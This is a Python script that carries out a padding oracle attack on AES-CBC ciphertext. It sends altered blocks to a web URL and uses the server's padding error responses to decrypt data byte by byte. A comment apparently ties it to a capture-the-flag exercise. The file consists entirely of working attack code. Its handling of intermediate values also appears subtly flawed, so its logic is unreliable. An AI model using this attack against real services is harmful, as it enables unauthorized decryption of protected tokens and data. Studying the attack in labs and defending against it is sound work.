import base64
import requests

base_url = ""
data = ""
block_size = 16  #AES block size is fixed to 16 bytes. Other CBC algorithms will differ. h101 was so kind to tell us they were using AES <3


def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

def decrypt_block(previous_block, current_block, block_size, base_url):
    intermediate_state = bytearray(block_size)
    decrypted_block = bytearray(block_size)

    for byte_index in reversed(range(block_size)):
        padding_value = block_size - byte_index

        for guess in range(256):
            modified_block = bytearray(previous_block)

            for i in range(1, padding_value + 1):
                modified_block[-i] = xor_bytes(intermediate_state[-i:], bytes([padding_value] * i))[0]

            modified_block[byte_index] = modified_block[byte_index] ^ guess
            modified_data = base64.urlsafe_b64encode(modified_block + current_block).decode('utf-8')
            modified_data = modified_data.replace('=', '~').replace('/', '!').replace('+', '-')

            print("Trying guess:", guess)
            print("Modified data:", modified_data)

            url = f"{base_url}{modified_data}"
            response = requests.get(url)

            if response.status_code == 200 and "padding" not in response.text.lower():
                intermediate_state[byte_index] = guess ^ padding_value
                decrypted_block[byte_index] = previous_block[byte_index] ^ intermediate_state[byte_index]
                break
            
    return decrypted_block

def decrypt_data(encrypted_data, block_size, base_url):
    iv = encrypted_data[:block_size]
    blocks = [encrypted_data[i:i+block_size] for i in range(block_size, len(encrypted_data), block_size)]
    decrypted_message = bytearray()
    previous_block = iv
    for block in blocks:
        decrypted_block = decrypt_block(previous_block, block, block_size, base_url)
    
        decrypted_message.extend(decrypted_block)
        previous_block = block
    return decrypted_message




adjusted_data = data.replace('~', '=').replace('!', '/').replace('-', '+')
binary_data = base64.urlsafe_b64decode(adjusted_data)


decrypted_message = decrypt_data(binary_data, block_size, base_url)
print("Decrypted message:", decrypted_message.decode(errors='ignore'))